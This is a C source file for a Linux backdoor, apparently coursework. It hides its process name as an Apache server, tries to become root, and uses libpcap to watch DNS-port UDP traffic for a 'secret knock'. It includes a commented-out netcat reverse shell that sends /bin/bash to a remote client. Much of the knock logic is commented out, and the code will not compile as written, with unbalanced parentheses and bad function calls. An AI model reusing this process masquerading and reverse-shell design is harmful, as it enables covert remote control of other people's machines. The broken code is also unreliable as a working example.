/*---------------------------------------------------------------------------------------
--	SOURCE FILE:	backdoor
--
--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
--					filter (BPF)
--
--	DATE:			May 21, 2015
--
--	REVISIONS:		(Date and nic_description)
--
--	DESIGNERS:		Based on the code by Martin Casado & Richard Stevens
--					Modified & redesigned: Aman Abdulla: April 23, 2006
--
--	PROGRAMMER:		Tim Kim, Damien Sathanielle
--
--	NOTES:
--	The program
--
--	Compile and run:
--
--		gcc -Wall -o backdoor backdoor.c -lpcap
--
--		./backdoor

---------------------------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <pthread.h>

#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>


#define R_KEY 82
#define G_KEY 71
#define B_KEY 66

#define BIT_SET(a,b) ((a) |= (1<<(b)))
#define MASK "/usr/sbin/apache2 -k start -DSSL"
#define NIC "wlp3s0"

unsigned char lock = 0b000;
/*-----------------------------------------------------------------------------------------------
-- FUNCTION:   mask_application(char *name)
--             name - 
--
-- REVISIONS:  
--
-- RETURNS:    none
--
-- NOTES:      Process incoming packets to look for secret knock.
--------------------------------------------------------------------------------------------------*/
void mask_application(char *name)
{
	memset(name, 0, strlen(name));
	strcpy(name, MASK);
	prctl(PR_SET_NAME, MASK, 0, 0);

	setuid(0);
	setgid(0);
}

/*-----------------------------------------------------------------------------------------------
-- FUNCTION:   process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
--             args - 
--             header - 
--             packet
--
-- REVISIONS:  
--
-- RETURNS:    none
--
-- NOTES:      Process incoming packets to look for secret knock.
--------------------------------------------------------------------------------------------------*/
void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	int size = header->len;
	unsigned short iphdrlen;

	struct iphdr *iph = (struct iphdr*)(packet + sizeof(struct ethhdr));
	iphdrlen = iph->ihl * 4;

	struct udphdr *udph = (struct udphdr*)(packet + iphdrlen + sizeof(struct ethhdr));


	int sPort = ntohs(udph->source);
	// make sure udp
	/*if((iph->protocol == 17))
	{
		int id = ntohs(iph->id);
		int dPort = ntohs(udph->dest);
		
		guess = (id % 100) + (dPort % 100);
		switch(guess)
		{
			case R_KEY:
				BIT_SET(lock, 0);
				break;
			case G_KEY:
				BIT_SET(lock, 1);
				break;
			case B_KEY:
				BIT_SET(lock, 2);
				break;
			default:
				break;
		}
	}*/
}


void *check_lock(void *ptr)
{
	if(!((lock + 1) & ((1 << 3) - 1))))
		execute_backdoor();

	lock = 0;
	sleep(5);
}

/*-----------------------------------------------------------------------------------------------
-- FUNCTION:   process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
--             args - 
--             header - 
--             packet
--
-- REVISIONS:  
--
-- RETURNS:    none
--
-- NOTES:      Process incoming packets to look for secret knock.
--------------------------------------------------------------------------------------------------*/
void execute_backdoor(char *addr, int port)
{
	printf("executing...\n");
	// send shell to client
	//system("nc %s %d -e /bin/bash", addr, port);
}

/*-----------------------------------------------------------------------------------------------
-- FUNCTION:   main
--
-- REVISIONS:  
--
-- RETURNS:    none
--
-- NOTES:      
--------------------------------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	char filter_exp[] = "port 53 and udp";  // filter expression
	const u_char *packet;
	pthread_t clThread;

	struct bpf_program fp;  // compiled filter expression
	struct pcap_pkthdr header;

	pcap_t *handle;         // session handle
	bpf_u_int32 mask;       // netmask
	bpf_u_int32 net;        // ip of dev
	

	mask_application(argv[0]);

	dev = NIC; //pcap_lookupdev(errbuf);
	if(dev == NULL)
	{
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	printf("Device: %s\n", dev);

	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	if(pcap_setfilter(handle, &fp) == -1)
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	
	//pthread_create( &clThread, NULL, check_lock, NULL);

	// rcv_packet will be called every time a packet is captured
	pcap_loop(handle, -1, process_packet, NULL);

	pcap_freecode(&fp);
	pcap_close(handle);

	return 0;

}
